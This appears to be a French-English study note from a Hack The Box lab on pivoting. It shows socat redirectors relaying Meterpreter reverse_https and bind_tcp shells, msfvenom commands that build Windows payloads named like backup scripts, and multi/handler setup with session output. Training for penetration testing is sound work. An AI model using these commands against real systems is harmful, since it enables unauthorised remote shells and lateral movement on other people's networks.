# Socat Redirection with a Reverse Shell and Bind Shell

{% hint style="warning" %}
Socat est un outil de relais bidirectionnel qui peut créer des sockets entre deux canaux réseau indépendants sans utiliser de tunnel SSH. Il agit comme un redirigeur qui peut écouter sur une adresse et un port, puis transmettre ces données vers une autre adresse IP et un autre port. Nous pouvons démarrer l'écouteur de Metasploit en utilisant la même commande mentionnée dans la dernière section sur notre machine d'attaque, puis exécuter Socat sur le serveur Ubuntu.
{% endhint %}

#### <mark style="color:green;">Démarrage de l'écouteur Socat</mark>

```bash
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

#### <mark style="color:green;">Création du Payload Windows</mark>

{% code overflow="wrap" fullWidth="true" %}
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```
{% endcode %}

#### <mark style="color:green;">Démarrage de la Console Metasploit</mark>

```bash
mrroboteLiot@htb[/htb]$ sudo msfconsole
```

#### <mark style="color:green;">Configuration et Démarrage du Multi/Handler</mark>

```bash
msf6 > use exploit/multi/handler
```

```bash
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 80
lport => 80
msf6 exploit(multi/handler) > run
```

```bash
[*] Started HTTPS reverse handler on https://0.0.0.0:80
```

```bash
meterpreter > getuid
Server username: INLANEFREIGHT\victor
```

***

## <mark style="color:red;">Socat Redirection with a Bind Shell</mark>

{% hint style="warning" %}
Comme avec le **reverse shell socat**, on peut aussi créer un **bind shell redirector**. Contrairement aux reverse shells qui se connectent du serveur Windows vers le serveur Ubuntu pour être redirigés vers notre hôte d’attaque, le bind shell fait que le serveur Windows ouvre un **listener** sur un port spécifique. On peut générer un payload bind shell pour Windows et l’exécuter sur la cible. Ensuite, on crée un redirector socat sur le serveur Ubuntu pour écouter les connexions entrantes du bind handler Metasploit et les transférer vers le bind shell sur la cible Windows.
{% endhint %}

![](https://academy.hackthebox.com/storage/modules/158/55.png)

<mark style="color:green;">**Creating the Windows Payload**</mark>

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 499 bytes
Final size of exe file: 7168 bytes
Saved as: backupjob.exe
```
{% endcode %}

<mark style="color:green;">**Starting Socat Bind Shell Listener**</mark>

```shell-session
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

Finally, we can start a Metasploit bind handler. This bind handler can be configured to connect to our socat's listener on port 8080 (Ubuntu server)

<mark style="color:green;">**Configuring & Starting the Bind multi/handler**</mark>

```shell-session
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOST 10.129.202.64
RHOST => 10.129.202.64
msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080
msf6 exploit(multi/handler) > run

[*] Started bind TCP handler against 10.129.202.64:8080
```

We can see a bind handler connected to a stage request pivoted via a socat listener upon executing the payload on a Windows target.
